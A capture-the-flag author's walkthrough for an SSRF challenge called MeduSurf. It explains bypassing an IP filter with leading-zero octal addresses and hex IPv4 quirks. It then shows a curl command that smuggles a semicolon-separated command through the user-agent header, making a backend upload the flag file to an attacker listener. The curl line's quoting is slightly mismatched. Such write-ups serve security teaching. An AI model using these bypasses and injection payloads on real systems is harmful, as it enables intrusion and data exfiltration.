# MeduSurf: Walkthrough

It's another SSRF! This time, exploits have been made slightly more difficult by:
- introducing a more thorough IP address filter
- moving sensitive internal functionality to a non-HTTP service that doesn't return sensitive data directly

The IP address filter attempts to block _all_ IP addresses from being passed as hostnames. However, the "performance optimization" breaks this because the IP address parser accepts arbitrarily many leading zeros in octal IPv4 addresses. ~(Side note: Unlike cURL, the underlying Erlang libraries treat IPv4 addresses with hexadecimal as if they're domain names. That comment isn't a lie.)~ _edit: see 'Alternatives' below_

Attempts to bypass the filter using redirects should fail. Gleam `httpc` as of 3.0.0 no longer follows redirects by default, overriding the behavior of the Erlang library it wraps.

The next step is sending a valid command to the backend service and exfiltrating the flag. This little Python service uses a custom protocol in which commands are separated by semicolons. There's a command to upload an arbitrary file to a supplied URL. It requires whitespace, so injecting this command in the request path shouldn't work. Fortunately, the new app forwards the `user-agent` header with proxied requests.

## The Author's Solution

1. Set up an HTTP listener to receive the file.
2. Construct an exploit payload with:
    - a valid localhost IP address containing lots of leading zeros for at least one octet
    - a `user-agent` header containing log export command like `;export_log_files /app/flag.txt ${LISTENER_URL};`
```bash
curl 'http://127.1:8080/proxy' \
  -H "user-agent: ;export_log_files%20flag.txt%20http://${LISTENER_HOST}:8080/;" \
  -H "content-type: application/json" \
  --data-raw "{\"url\":\"http://127.0000000000000000000000000000000000000000000000000000000000000000001:1337/\"}'
```

## Alternatives

It's probably possible to bypass the URL filter by pointing a domain at localhost, too. I haven't bothered to test that method, but also didn't bother to try to block it.

Mid-CTF update: There was an unintended solve using hexadecimal IPv4! I believe it works because Erlang's `inet:gethostbyname` uses the system's libc `gethostbyname` (`man 3 gethostbyname`). On my laptop (EndeavourOS, using glibc), this does not treat hexadecimal IPv4 addresses as IP addresses. On Alpine (using musl, and the base image for the `medusurf` container) `gethostbyname` _does_ resolve hexadecimal IPv4 addresses as literal addresses. Next time, I'll need to remember to check for system-dependent quirks in hostname resolution :)
